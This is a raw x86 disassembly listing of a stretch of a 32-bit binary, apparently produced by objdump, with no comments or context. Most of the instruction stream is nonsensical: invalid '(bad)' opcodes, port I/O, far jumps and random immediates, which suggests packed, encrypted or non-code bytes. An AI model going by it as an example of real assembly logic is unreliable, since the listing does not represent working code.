  40d7e9:	mov    ebp,0x549e4a16
  40d7ee:	mov    bl,BYTE PTR [ebp-0xb]
  40d7f1:	inc    esi
  40d7f2:	pop    es
  40d7f3:	call   0xcd78:0x6b5be986
  40d7fa:	and    edi,DWORD PTR [ecx+edi*2-0x60bf623b]
  40d801:	test   DWORD PTR [ebx+ebp*1-0x72a28c5c],eax
  40d808:	loopne 0x40d851
  40d80a:	fs popa 
  40d80c:	dec    edi
  40d80d:	push   cs
  40d80e:	lock test eax,0xa37da005
  40d814:	(bad)  
  40d815:	xlat   BYTE PTR ds:[ebx]
  40d816:	rol    cl,1
  40d818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d819:	das    
  40d81a:	mov    ebx,0x9a8484b2
  40d81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d820:	jne    0x40d8a1
  40d822:	into   
  40d823:	int    0xa1
  40d825:	add    bl,BYTE PTR [esi+ecx*2+0x4c7664a8]
  40d82c:	cwde   
  40d82d:	ret    
  40d82e:	iret   
  40d82f:	inc    ebx
  40d830:	sbb    DWORD PTR [edi+ebx*2-0x44e8177f],eax
  40d837:	or     al,0xb
  40d839:	sbb    al,0xc5
  40d83b:	sar    DWORD PTR [eax+0x38bef4b3],cl
  40d841:	or     bl,BYTE PTR [eax+0x2bdd2971]
  40d847:	mov    ebp,esi
  40d849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d84a:	mov    ebx,0x70b5e980
  40d84f:	sbb    cl,BYTE PTR [edi-0x5d]
  40d852:	push   0xb1d7b7de
  40d857:	into   
  40d858:	es or  eax,0xb6f0b628
  40d85e:	sbb    edi,edi
  40d860:	cwde   
  40d861:	out    dx,eax
  40d862:	xchg   esp,eax
  40d863:	stos   DWORD PTR es:[edi],eax
  40d864:	ret    0xdf6e
  40d867:	sbb    al,0x9a
  40d869:	into   
  40d86a:	pushf  
  40d86b:	dec    eax
  40d86c:	mov    ebx,0x4844f877
  40d871:	inc    edi
  40d872:	mov    eax,ds:0x14f33d38
  40d877:	outs   dx,DWORD PTR ds:[esi]
  40d878:	out    dx,eax
  40d879:	mov    eax,0xbe0972
  40d87e:	call   0x10e6:0x3cf7b3f1
  40d885:	test   DWORD PTR [esp+0x7c8100c2],ebx
  40d88c:	fwait
  40d88d:	out    dx,al
  40d88e:	pop    es
  40d88f:	mov    eax,ds:0x1acd4121
  40d894:	pusha  
  40d895:	int    0xc1
  40d897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d898:	or     ecx,DWORD PTR [ecx]
  40d89a:	nop
  40d89b:	add    eax,0xa418c8b1
  40d8a0:	push   ecx
  40d8a1:	stos   BYTE PTR es:[edi],al
  40d8a2:	pop    es
  40d8a3:	pop    ds
  40d8a4:	out    0x95,al
  40d8a6:	idiv   DWORD PTR [edi]
  40d8a8:	stos   BYTE PTR es:[edi],al
  40d8a9:	fsubr  DWORD PTR [edx+0x46]
  40d8ac:	lods   eax,DWORD PTR ds:[esi]
  40d8ad:	or     eax,0xe45a82c0
  40d8b2:	in     eax,0xf4
  40d8b4:	nop
  40d8b5:	fcmovb st,st(2)
  40d8b7:	jle    0x40d906
  40d8b9:	and    DWORD PTR [ebx+0x5c],ebp
  40d8bc:	lods   al,BYTE PTR ds:[esi]
  40d8bd:	pop    ss
  40d8be:	mov    edi,DWORD PTR [esi-0x5e]
  40d8c1:	jb     0x40d8e0
  40d8c3:	mov    esi,0xca3d0abe
  40d8c8:	inc    esi
  40d8c9:	fadd   QWORD PTR [ebp-0x76cd6d40]
  40d8cf:	ins    DWORD PTR es:[edi],dx
  40d8d0:	and    eax,0xa1aa7dd9
  40d8d5:	mov    bh,0x31
  40d8d7:	or     eax,0x2528c1b6
  40d8dc:	mov    cs,WORD PTR [esi]
  40d8de:	or     BYTE PTR [ecx+0x2bc3de2b],ah
  40d8e4:	imul   edx
  40d8e6:	xchg   edx,eax
  40d8e7:	sbb    ecx,esi
  40d8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ea:	dec    edx
  40d8eb:	dec    esi
  40d8ec:	lds    ebp,FWORD PTR [edx+eax*4]
  40d8ef:	mov    ds:0x5522ead7,al
  40d8f4:	aas    
  40d8f5:	nop
  40d8f6:	pushf  
  40d8f7:	add    DWORD PTR [edi+0x67],0xd8644a47
  40d8fe:	cmp    DWORD PTR [eax-0x52dd221f],ecx
  40d904:	push   esi
  40d905:	pop    ss
  40d906:	dec    edx
  40d907:	jne    0x40d89c
  40d909:	mov    eax,ds:0xbed1a470
  40d90f:	shl    DWORD PTR [eax+0x3a68e1ff],cl
  40d915:	adc    cl,cl
  40d917:	adc    DWORD PTR [ecx+0x7f413f47],0xffffffa6
  40d91e:	jge    0x40d97f
  40d920:	mov    esi,0xad968826
  40d925:	sbb    esi,DWORD PTR [edx+0x61]
  40d928:	or     ecx,DWORD PTR [ecx-0x2]
  40d92b:	and    BYTE PTR [edx+esi*4-0x27],dl
  40d92f:	mov    eax,0x44380b93
  40d934:	out    dx,al
  40d935:	popa   
  40d936:	push   edx
  40d937:	dec    ebp
  40d938:	mov    WORD PTR [esi+eax*4+0x1d8fb8e3],?
  40d93f:	inc    ecx
  40d940:	mov    ah,0xbc
  40d942:	scas   eax,DWORD PTR es:[edi]
  40d943:	into   
  40d944:	lods   eax,DWORD PTR ds:[esi]
  40d945:	ret    0xd134
  40d948:	push   esp
  40d949:	ror    DWORD PTR [ebx+0x45],1
  40d94c:	nop
  40d94d:	mov    bl,0xdc
  40d94f:	in     eax,0x35
  40d951:	test   bh,dh
  40d953:	arpl   sp,bx
  40d955:	xchg   edi,eax
  40d956:	dec    ebx
  40d957:	cld    
  40d958:	ss ins BYTE PTR es:[edi],dx
  40d95a:	xor    DWORD PTR [eax+0xb],edi
  40d95d:	stos   BYTE PTR es:[edi],al
  40d95e:	cmp    eax,0x2e777524
  40d963:	add    DWORD PTR [edx+edx*4-0x7ef18a8e],esi
  40d96a:	cs enter 0x697d,0x5
  40d96f:	pop    esp
  40d970:	xor    DWORD PTR [ecx+0x13371f9e],0x6014f069
  40d97a:	int    0x4a
  40d97c:	stos   BYTE PTR es:[edi],al
  40d97d:	pusha  
  40d97e:	mov    cx,0xab58
  40d982:	imul   esi,DWORD PTR [ebx+0x49],0xffffff82
  40d986:	scas   eax,DWORD PTR es:[edi]
  40d987:	ret    0x420f
  40d98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d98b:	retf   
  40d98c:	sbb    ch,BYTE PTR [edx+0x394cf3fe]
  40d992:	repnz sbb eax,0xba35c2b1
  40d998:	cmp    esi,esi
  40d99a:	mov    WORD PTR [esi],ds
  40d99c:	int    0xfc
  40d99e:	inc    esi
  40d99f:	mov    edx,0xdd33a5e5
  40d9a4:	push   edx
  40d9a5:	(bad)  
  40d9a6:	or     DWORD PTR fs:0x9d70d75,0x12
  40d9ae:	dec    esp
  40d9af:	jp     0x40d95e
  40d9b1:	in     al,0x99
  40d9b3:	fucom  st(0)
  40d9b5:	out    0x3c,al
  40d9b7:	push   ecx
  40d9b8:	lea    ecx,[esi+ebp*8-0x4cd4d0d1]
  40d9bf:	call   0x9c91:0x6c55e633
  40d9c6:	pop    ecx
  40d9c7:	mov    edx,0x31d639d6
  40d9cc:	cs xchg ecx,esp
  40d9cf:	loopne 0x40d954
  40d9d1:	pop    ss
  40d9d2:	mov    eax,0x8d5c2ffd
  40d9d7:	cld    
  40d9d8:	inc    esi
  40d9d9:	xchg   ebx,eax
  40d9da:	mov    ch,0x98
  40d9dc:	aad    0x62
  40d9de:	test   al,0x83
  40d9e0:	xchg   cl,dl
  40d9e2:	fadd   DWORD PTR [edi]
  40d9e4:	cmp    ecx,DWORD PTR [ecx]
  40d9e6:	stc    
  40d9e7:	shl    BYTE PTR [edx],1
  40d9e9:	or     BYTE PTR [eax],dh
  40d9eb:	xchg   ebx,eax
  40d9ec:	sbb    al,0x1b
  40d9ee:	scas   eax,DWORD PTR es:[edi]
  40d9ef:	mov    bh,BYTE PTR [ecx+0x4813242]
  40d9f5:	lahf   
  40d9f6:	xor    DWORD PTR ds:0x1680260,eax
  40d9fc:	and    BYTE PTR [edi+0x6e36dfea],ch
  40da02:	sub    al,0xb9
  40da04:	sub    ebp,DWORD PTR [ecx]
  40da06:	ror    DWORD PTR [ebp-0x274d70a1],cl
  40da0c:	cmovnp esi,ecx
  40da0f:	jp     0x40da3f
  40da11:	dec    esp
  40da12:	pop    esp
  40da13:	pop    ebx
  40da14:	xor    eax,0xbb8c122b
  40da19:	je     0x40da46
  40da1b:	lds    ebx,FWORD PTR [ebp+0x51]
  40da1e:	arpl   WORD PTR [eax-0x51d1cb3],di
  40da24:	pop    eax
  40da25:	xchg   edi,eax
  40da26:	sbb    al,0x61
  40da28:	iret   
  40da29:	cmp    eax,0xc9f74f9d
  40da2e:	js     0x40da6c
  40da30:	sub    ah,BYTE PTR [ebx]
  40da32:	or     DWORD PTR [edi],esp
  40da34:	inc    esi
  40da35:	fdivp  st(0),st
  40da37:	mov    ebp,0xce42d563
  40da3c:	out    0x3b,eax
  40da3e:	repz push edi
  40da40:	dec    eax
  40da41:	and    DWORD PTR [edi-0x66],ebx
  40da44:	jmp    0xc784:0xe1e233ba
  40da4b:	cdq    
  40da4c:	xchg   edi,eax
  40da4d:	mov    ebp,0x59305ad1
  40da52:	xor    ch,BYTE PTR [ebx+0x2210c2ef]
  40da58:	mov    eax,ds:0x8a637c29
  40da5d:	(bad)  
  40da5e:	in     eax,dx
  40da5f:	into   
  40da60:	popa   
  40da61:	xor    eax,0x69966b65
  40da66:	xchg   ebx,eax
  40da67:	out    0x5e,eax
  40da69:	push   eax
  40da6a:	push   edx
  40da6b:	jg     0x40da9b
  40da6d:	dec    eax
  40da6e:	mov    dl,0x1a
  40da70:	imul   esi,DWORD PTR [eax+0x18],0x8d9ec7e7
  40da77:	mov    bh,BYTE PTR [esi]
  40da79:	sub    al,0x20
  40da7b:	mov    dl,0xd3
  40da7d:	push   0xfffffff2
  40da7f:	pop    ss
  40da80:	sub    eax,0x41f00eb
  40da85:	mov    WORD PTR [eax+0x5c],ss
  40da88:	mov    BYTE PTR [esi-0x7a06604e],ah
  40da8e:	loope  0x40da4d
  40da90:	in     al,dx
  40da91:	adc    esp,DWORD PTR [edx]
  40da93:	mov    ch,0x11
  40da95:	test   BYTE PTR [ebx+0x117a2d0c],cl
  40da9b:	icebp  
  40da9c:	mov    ecx,0x97c2ace4
  40daa1:	xchg   esp,eax
  40daa2:	loope  0x40daef
  40daa4:	mov    edi,0x6a639f03
  40daa9:	inc    ebx
  40daaa:	ins    BYTE PTR es:[edi],dx
  40daab:	jmp    FWORD PTR [ebp-0x1]
  40daae:	xor    eax,0xa81901e
  40dab3:	or     cl,BYTE PTR [ebx-0x6]
  40dab6:	push   edx
  40dab7:	xor    al,0xb5
  40dab9:	dec    edx
  40daba:	ret    
  40dabb:	xor    BYTE PTR [esp+edx*1+0x39f39769],cl
  40dac2:	call   0xb100a7a0
  40dac7:	rcr    ah,0xba
  40daca:	lods   eax,DWORD PTR ds:[esi]
  40dacb:	inc    ecx
  40dacc:	ss pop esi
  40dace:	ss dec esp
  40dad0:	mov    eax,ds:0x2be8c3af
  40dad5:	adc    eax,0x2476300f
  40dada:	int    0x5c
  40dadc:	add    eax,0x792f106a
  40dae1:	and    BYTE PTR [edx],al
  40dae3:	jb     0x40db22
  40dae5:	shl    ebp,0x2c
  40dae8:	mov    al,0x1a
  40daea:	fcom   DWORD PTR [edi]
  40daec:	mov    ecx,0xea21ce0d
  40daf1:	jmp    0x4da5:0x1b23df42
  40daf8:	jl     0x40db49
  40dafa:	inc    ax
  40dafc:	aas    
  40dafd:	lds    edi,FWORD PTR [edx]
  40daff:	push   ss
  40db00:	cmp    BYTE PTR [ebp+0x79],ah
  40db03:	aam    0xf9
  40db05:	mov    DWORD PTR [edi+0x45380b51],esi
  40db0b:	nop
  40db0c:	test   DWORD PTR [ebx-0x1a108752],0x82fbc20d
  40db16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db17:	and    eax,0xc7e2a4c8
  40db1c:	nop
  40db1d:	jns    0x40dab6
  40db1f:	gs hlt 
  40db21:	pop    esp
  40db22:	mov    eax,DWORD PTR [ebx-0x17169337]
  40db28:	leave  
  40db29:	and    DWORD PTR [edi],0x39
  40db2c:	sbb    BYTE PTR [edx],bh
  40db2e:	(bad)  
  40db30:	push   DWORD PTR [eax]
  40db32:	sahf   
  40db33:	xor    esp,edi
  40db35:	es cli 
  40db37:	ret    
  40db38:	scas   al,BYTE PTR es:[edi]
  40db39:	add    DWORD PTR [edi+eax*2],edi
  40db3c:	mov    ebp,0x3a4c372b
  40db41:	jne    0x40dadd
  40db43:	sub    al,0xdc
  40db45:	pop    es
  40db46:	aam    0x81
  40db48:	dec    edx
  40db49:	pop    esi
  40db4a:	add    DWORD PTR [edi-0x44],ebx
  40db4d:	mov    eax,0x40d0f8e3
  40db52:	inc    eax
  40db53:	jge    0x40dbc9
  40db55:	lds    esp,FWORD PTR [ecx+ebx*4-0x3df3ad66]
  40db5c:	ret    0x9903
  40db5f:	cs jmp 0x4c6e8c91
  40db65:	or     BYTE PTR [ebx-0x49d927d2],dl
  40db6b:	stos   BYTE PTR es:[edi],al
  40db6c:	scas   eax,DWORD PTR es:[edi]
  40db6d:	and    eax,0xe0ddf228
  40db72:	mov    ah,0x32
  40db74:	mov    eax,0xd8eee541
  40db79:	mov    ebx,0xea012c48
  40db7e:	xor    ah,BYTE PTR [ecx]
  40db80:	ret    0x83
  40db83:	push   ecx
  40db84:	mov    eax,ds:0xe3bd909d
  40db89:	in     eax,0x4
  40db8b:	mov    eax,ds:0x389ca668
  40db90:	clc    
  40db91:	mov    ds:0x9b913f0,al
  40db96:	pushf  
  40db97:	mov    BYTE PTR [edx-0x55],ch
  40db9a:	or     BYTE PTR [eax],ch
  40db9c:	add    edx,eax
  40db9e:	mov    bh,0x9
  40dba0:	mov    WORD PTR [esi+0x7234ef12],ds
  40dba6:	pop    edi
  40dba7:	ins    DWORD PTR es:[edi],dx
  40dba8:	sbb    esp,ecx
  40dbaa:	adc    DWORD PTR [eax],edx
  40dbac:	and    al,dl
  40dbae:	xchg   DWORD PTR [esi-0x4d],esi
  40dbb1:	push   0xb1859278
  40dbb6:	aas    
  40dbb7:	sub    al,0x29
  40dbb9:	and    eax,0x504bda3b
  40dbbe:	adc    BYTE PTR [eax-0x1f69b575],ah
  40dbc4:	out    dx,eax
  40dbc5:	hlt    
  40dbc6:	jbe    0x40dbfb
  40dbc8:	xor    dh,BYTE PTR [eax]
  40dbca:	add    eax,0x1c02b332
  40dbcf:	popf   
  40dbd0:	bound  esi,QWORD PTR [eax-0xa66f4f4]
  40dbd6:	ja     0x40dbb6
  40dbd8:	aas    
  40dbd9:	les    ebx,FWORD PTR [esi+0x1c]
  40dbdc:	es inc ebx
  40dbde:	lock addr16 out 0x4e,al
  40dbe2:	sub    dl,BYTE PTR [edx+0x71891e3d]
  40dbe8:	mov    ebx,0x6a1a9476
  40dbed:	mov    al,0xb4
  40dbef:	popa   
  40dbf0:	mov    al,ds:0x2bb9ba50
  40dbf5:	aaa    
  40dbf6:	or     al,0xcf
  40dbf8:	mov    eax,0xe67ec046
  40dbfd:	icebp  
  40dbfe:	dec    ecx
  40dbff:	mov    DWORD PTR [esi],esp
  40dc01:	in     al,0xde
  40dc03:	pop    ss
  40dc04:	enter  0xe967,0x7c
  40dc08:	hlt    
  40dc09:	mov    cs,WORD PTR [ebp+0x7047b8bd]
  40dc0f:	retf   0xa4f8
  40dc12:	inc    ecx
  40dc13:	enter  0x47ec,0xf1
  40dc17:	outs   dx,DWORD PTR ds:[esi]
  40dc18:	sbb    dh,dh
  40dc1a:	jmp    0xb1eb04d7
  40dc1f:	mov    esi,0x50e7dab6
  40dc24:	pop    ebp
  40dc25:	add    esi,esi
  40dc27:	cmp    al,0x86
  40dc29:	call   0x2b92:0x9c3fddb2
  40dc30:	sar    BYTE PTR [edx+0x55735252],cl
  40dc36:	stos   DWORD PTR es:[edi],eax
  40dc37:	xchg   ebp,eax
  40dc38:	jae    0x40dc74
  40dc3a:	pop    ebx
  40dc3b:	mov    al,0x0
  40dc3d:	stc    
  40dc3e:	pop    eax
  40dc3f:	add    DWORD PTR [edi-0x7ce7f326],ebx
  40dc45:	xchg   ebx,eax
  40dc46:	jno    0x40dc2f
  40dc48:	sub    eax,0xd459c27c
  40dc4d:	sub    bh,cl
  40dc4f:	pushf  
  40dc50:	mov    ebp,edi
  40dc52:	xlat   BYTE PTR ds:[ebx]
  40dc54:	push   es
  40dc55:	push   es
  40dc56:	or     eax,0x16df2287
  40dc5b:	(bad)  
  40dc5c:	adc    eax,0x7be35b2a
  40dc61:	add    eax,0xde14f562
  40dc66:	ins    DWORD PTR es:[edi],dx
  40dc67:	and    al,0xec
  40dc69:	out    0x44,eax
  40dc6b:	and    BYTE PTR [ebx-0x6d],dl
  40dc6e:	fdiv   DWORD PTR gs:[esi]
  40dc71:	add    al,bh
  40dc73:	test   BYTE PTR [ecx+0x4e],bh
  40dc76:	imul   edi,DWORD PTR [ebp+ebx*4+0x380ab2bd],0xb6f7e392
  40dc81:	in     al,0x6a
  40dc83:	sbb    BYTE PTR [edi-0x62],bh
  40dc86:	ret    0xb326
  40dc89:	mov    ebp,DWORD PTR [ecx]
  40dc8b:	call   0x6ee5df53
  40dc90:	or     bl,BYTE PTR [edx]
  40dc92:	es cwde 
  40dc94:	jno    0x40dcf4
  40dc96:	(bad)
  40dc99:	mov    al,ds:0x966303da
  40dc9e:	outs   dx,BYTE PTR ds:[esi]
  40dc9f:	fs push esi
  40dca1:	sti    
  40dca2:	pop    esi
  40dca3:	adc    DWORD PTR [edx+0x459167bd],esi
  40dca9:	pop    eax
  40dcaa:	xor    ah,bh
  40dcac:	pop    es
  40dcad:	stos   DWORD PTR es:[edi],eax
  40dcae:	and    DWORD PTR [ecx],ebp
  40dcb0:	mov    ebx,0x31cfbf62
  40dcb5:	(bad)  
  40dcb6:	ja     0x40dc8e
  40dcb8:	cmp    edi,DWORD PTR [ebp+0x57]
  40dcbb:	popa   
  40dcbc:	inc    eax
  40dcbd:	jns    0x40dd19
  40dcbf:	mov    al,ds:0xa3d2621e
  40dcc4:	retf   
  40dcc5:	aad    0x2b
  40dcc7:	jno    0x40dd30
  40dcc9:	data16 fdivr DWORD PTR [edi-0x39]
  40dccd:	mov    ebp,0xd1d8a172
  40dcd2:	push   ds
  40dcd3:	pushf  
  40dcd4:	retf   0xb181
  40dcd7:	fild   WORD PTR [eax-0x3e]
  40dcda:	cmp    edi,DWORD PTR [eax]
  40dcdc:	cmp    ebx,DWORD PTR [ecx-0x11]
  40dcdf:	aad    0x49
  40dce1:	es push edi
  40dce3:	dec    edx
  40dce4:	pusha  
  40dce5:	nop
  40dce6:	lods   al,BYTE PTR ds:[esi]
  40dce7:	xor    DWORD PTR [esi],ebx
  40dce9:	popa   
  40dcea:	and    eax,0xc3f5e5f5
  40dcef:	or     al,0x61
  40dcf1:	enter  0x3ecf,0xc9
  40dcf5:	lahf   
  40dcf6:	loope  0x40dd1d
  40dcf8:	xchg   ebp,eax
  40dcf9:	cmp    esi,DWORD PTR [ebx+0x28]
  40dcfc:	xor    edi,DWORD PTR [ecx]
  40dcfe:	jp     0x40dd3c
  40dd00:	xchg   esp,eax
  40dd01:	stos   BYTE PTR es:[edi],al
  40dd02:	(bad)  
  40dd03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd04:	push   esi
  40dd05:	daa    
  40dd06:	test   DWORD PTR [edx-0x30],0x3f58b6a4
  40dd0d:	mov    ecx,0x9d8dcd5b
  40dd12:	jno    0x40dd77
  40dd14:	stc    
  40dd15:	mov    bl,0x32
  40dd17:	mov    ah,0xad
  40dd19:	inc    eax
  40dd1a:	pop    ds
  40dd1b:	sahf   
  40dd1c:	mov    eax,ds:0x2ae50079
  40dd21:	xchg   ecx,eax
  40dd22:	lods   eax,DWORD PTR ds:[esi]
  40dd23:	popa   
  40dd24:	fwait
  40dd25:	outs   dx,BYTE PTR ds:[esi]
  40dd26:	sbb    BYTE PTR [esi+0x9efe078],ch
  40dd2c:	fadd   QWORD PTR [ecx]
  40dd2e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40dd30:	push   DWORD PTR [edx+ebp*2+0x19c4a301]
  40dd37:	xlat   BYTE PTR ds:[ebx]
  40dd38:	jmp    0x40dd94
  40dd3a:	cmp    BYTE PTR [edx+edi*2+0x13],dl
  40dd3e:	inc    ecx
  40dd3f:	gs call 0x37f4:0xadf9fa8b
  40dd47:	xchg   ecx,eax
  40dd48:	mov    WORD PTR [eax],?
  40dd4a:	or     DWORD PTR [ebx+0x7],ebx
  40dd4d:	js     0x40dd76
  40dd4f:	and    DWORD PTR [ebx],ecx
  40dd51:	cs xchg esi,eax
  40dd53:	in     eax,0xc6
  40dd55:	xor    DWORD PTR [ecx+0x23],eax
  40dd58:	ja     0x40ddc4
  40dd5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd5b:	pop    ebp
  40dd5c:	and    ecx,esp
  40dd5e:	daa    
  40dd5f:	(bad)  
  40dd61:	adc    BYTE PTR [ebx-0x58],al
  40dd64:	(bad)  
  40dd65:	dec    ebp
  40dd66:	addr16 jge 0x40dd11
  40dd69:	push   0xffffff8f
  40dd6b:	jne    0x40dd1e
  40dd6d:	add    ecx,ebx
  40dd6f:	dec    ecx
  40dd70:	pop    esp
  40dd71:	aaa    
  40dd72:	(bad)  
  40dd74:	xchg   edi,eax
  40dd75:	mov    edi,0x2811b69d
  40dd7a:	inc    ecx
  40dd7b:	arpl   dx,ax
  40dd7d:	add    eax,0x74645bdb
  40dd82:	xor    ah,ah
  40dd84:	std    
  40dd85:	fisub  DWORD PTR [eax-0x120a2d2b]
  40dd8b:	cmp    cl,cl
  40dd8d:	aaa    
  40dd8e:	sub    cl,BYTE PTR [edx+0x4c]
  40dd91:	mov    DWORD PTR [ecx-0x2092e594],ecx
  40dd97:	jbe    0x40dde7
  40dd99:	push   0x47
  40dd9b:	adc    al,0x52
  40dd9d:	fadd   st(7),st
  40dd9f:	xor    ebp,ebp
  40dda1:	mov    dl,0x2e
  40dda3:	lds    edx,FWORD PTR [ebx+0x74]
  40dda6:	mov    dl,0x18
  40dda8:	adc    DWORD PTR [eax+0x48e1af27],eax
  40ddae:	dec    esi
  40ddaf:	xchg   DWORD PTR [edx+ebp*2-0x5f],ecx
  40ddb3:	mov    WORD PTR [esp+esi*8-0x60a914ef],fs
  40ddba:	dec    eax
  40ddbb:	clc    
  40ddbc:	jmp    0x40dd6e
  40ddbe:	xchg   ebp,eax
  40ddbf:	jl     0x40ddc3
  40ddc1:	push   esp
  40ddc2:	add    dl,0xda
  40ddc5:	jnp    0x40dd8e
  40ddc7:	jno    0x40de0e
  40ddc9:	test   eax,0x1b3f0323
  40ddce:	push   es
  40ddcf:	fst    DWORD PTR [ebp-0x5416fe73]
  40ddd5:	aas    
  40ddd6:	jmp    0x40dd74
  40ddd8:	pop    esi
  40ddd9:	mov    ds,WORD PTR [ebx]
  40dddb:	push   0xffffff80
  40dddd:	cmp    DWORD PTR [bx+si+0x72],edi
  40dde1:	mov    dl,0xf7
  40dde3:	xor    edx,DWORD PTR [ecx-0x70558763]
  40dde9:	jmp    0x47e1:0xd01d2606
  40ddf0:	jae    0x40de39
  40ddf2:	outs   dx,DWORD PTR ds:[esi]
  40ddf3:	jbe    0x40ddae
  40ddf5:	shr    BYTE PTR [edx+0x74f5e6b7],1
  40ddfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddfc:	mov    ecx,0x22a5145e
  40de01:	cmp    BYTE PTR [ecx-0x6a],0x56
  40de05:	and    ebx,edi
  40de07:	retf   
  40de08:	outs   dx,BYTE PTR ds:[esi]
  40de09:	bound  edx,QWORD PTR [ecx]
  40de0b:	sar    bh,cl
  40de0d:	aaa    
  40de0e:	mov    ebx,ss
  40de10:	repz ror BYTE PTR [edi-0xc],1
  40de14:	daa    
  40de15:	popf   
  40de16:	(bad)  [eax-0x49635f53]
  40de1c:	dec    eax
  40de1d:	frstor [ebp+0x5ce716d]
  40de23:	cld    
  40de24:	aas    
  40de25:	(bad)  
  40de26:	jge    0x40ddfc
  40de28:	jmp    0xd45e:0xab89b25a
  40de2f:	pushf  
  40de30:	jl     0x40de99
  40de32:	add    al,ah
  40de34:	pushf  
  40de35:	xchg   esp,eax
  40de36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de37:	test   eax,0xdbdc2edc
  40de3c:	jge    0x40de78
  40de3e:	(bad)  
  40de3f:	mov    esi,0x1d6142a5
  40de44:	adc    BYTE PTR [ebx+0x7f01afa0],al
  40de4a:	ds pop ss
  40de4c:	add    al,0xe4
  40de4e:	fsubr  DWORD PTR [ebx-0x78]
  40de51:	into   
  40de52:	shl    edx,1
  40de54:	shl    BYTE PTR [ecx],1
  40de56:	cmp    eax,0xaf902c39
  40de5b:	sbb    DWORD PTR [ecx+ebx*2-0x150c6f47],edi
  40de62:	cmp    edi,esi
  40de64:	aad    0xe7
  40de66:	adc    eax,0xcb9052e4
  40de6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de6c:	pop    eax
  40de6d:	cmc    
  40de6e:	call   0xd73bb1c1
  40de73:	aad    0xb2
  40de75:	fcmovnbe st,st(4)
  40de77:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de79:	retf   
  40de7a:	jmp    DWORD PTR [ebp-0x2ae09f0d]
  40de80:	data16 and ch,BYTE PTR [edi-0x4a591147]
  40de87:	dec    ebp
  40de88:	aad    0x4e
  40de8a:	repnz test BYTE PTR gs:[ebp-0x38de676f],0xd6
  40de93:	imul   ch
  40de95:	and    esi,DWORD PTR [ebp-0x5817cef1]
  40de9b:	outs   dx,DWORD PTR ds:[esi]
  40de9c:	cdq    
  40de9d:	xchg   ebp,eax
  40de9e:	mov    eax,ds:0x3aac4c6f
  40dea4:	lea    ecx,[ebx+0x5]
  40dea7:	xchg   ebx,eax
  40dea8:	aaa    
  40dea9:	or     al,0x76
  40deab:	ror    BYTE PTR [ecx],1
  40dead:	out    0x29,al
  40deaf:	into   
  40deb0:	out    dx,al
  40deb1:	sbb    cl,BYTE PTR [eax+0x77]
  40deb4:	xchg   bh,cl
  40deb6:	push   ss
  40deb7:	mov    eax,0xea29b80a
  40debc:	cdq    
  40debd:	inc    esp
  40debe:	shr    DWORD PTR [ebp-0x19762a15],0x14
  40dec5:	xchg   edi,eax
  40dec6:	iret   
  40dec7:	sub    cl,BYTE PTR [esi]
  40dec9:	jb     0x40df10
  40decb:	and    al,0x2d
  40decd:	sahf   
  40dece:	inc    ebp
  40decf:	lds    ebx,FWORD PTR [edi-0x161a53af]
  40ded5:	jmp    0xe5e:0x6563de3b
  40dedc:	fst    st(3)
  40dede:	sub    ebp,DWORD PTR [edx]
  40dee0:	fist   DWORD PTR ds:[ebp-0x60]
  40dee4:	adc    eax,DWORD PTR [ebx-0x2]
  40dee7:	xchg   DWORD PTR [ecx-0x38],ebx
  40deea:	mov    ah,BYTE PTR [ebx*4+0x1c4b5e30]
  40def1:	jmp    0x40df1b
  40def3:	dec    ecx
  40def4:	inc    ecx
  40def5:	xchg   edx,eax
  40def6:	lea    edx,gs:[eax]
  40def9:	add    DWORD PTR [edx],edi
  40defb:	cli    
  40defc:	cmc    
  40defd:	imul   edx,eax,0x2f632e14
  40df03:	adc    DWORD PTR [eax-0x67],0xa2951d3c
  40df0a:	in     eax,dx
  40df0b:	pop    ss
  40df0c:	pop    ecx
  40df0d:	mov    es,WORD PTR [ebp+0x11]
  40df10:	nop
  40df11:	js     0x40def6
  40df13:	test   eax,0x2654fa4
  40df18:	add    esp,esp
  40df1a:	aad    0x55
  40df1c:	fld    TBYTE PTR [esi]
  40df1e:	dec    ebp
  40df1f:	xchg   ebp,eax
  40df20:	inc    edx
  40df21:	ficom  DWORD PTR [edi]
  40df23:	xor    BYTE PTR [eax+0x2243e448],0xa7
  40df2a:	(bad)  
  40df2b:	cdq    
  40df2c:	jnp    0x40df9e
  40df2e:	nop
  40df2f:	ja     0x40df54
  40df31:	and    bh,bl
  40df33:	jg     0x40deea
  40df35:	jge    0x40deeb
  40df37:	push   ecx
  40df38:	mov    eax,ds:0x5bf9a7bd
  40df3d:	xchg   esi,eax
  40df3e:	mov    al,ds:0xb0f4a0d
  40df43:	pop    esp
  40df44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df45:	jecxz  0x40df15
  40df47:	push   cs
  40df48:	add    BYTE PTR [esi-0x157df285],cl
  40df4e:	mov    DWORD PTR [edi-0x1c],esp
  40df51:	mov    dh,BYTE PTR [edx+0x73]
  40df54:	imul   eax,DWORD PTR [edx-0x3c],0xa0943aaf
  40df5b:	(bad)  
  40df5c:	mov    esp,0xcb438877
  40df61:	inc    ecx
  40df62:	sub    eax,0x87e25d04
  40df67:	ror    al,0x1e
  40df6a:	mov    BYTE PTR [esi],dh
  40df6c:	cs gs in eax,0xa9
  40df70:	and    BYTE PTR [ebp-0x4f],0x80
  40df74:	pop    ebp
  40df75:	mov    ds:0x5ec4b67a,al
  40df7a:	sbb    BYTE PTR [edx-0x64],ah
  40df7d:	das    
  40df7e:	mov    al,0x1b
  40df80:	in     eax,dx
  40df81:	sub    bl,BYTE PTR [edx]
  40df83:	mov    edi,0xb61b2c2e
  40df88:	(bad)  
  40df89:	popf   
  40df8a:	sbb    bh,BYTE PTR [esi-0x4429a496]
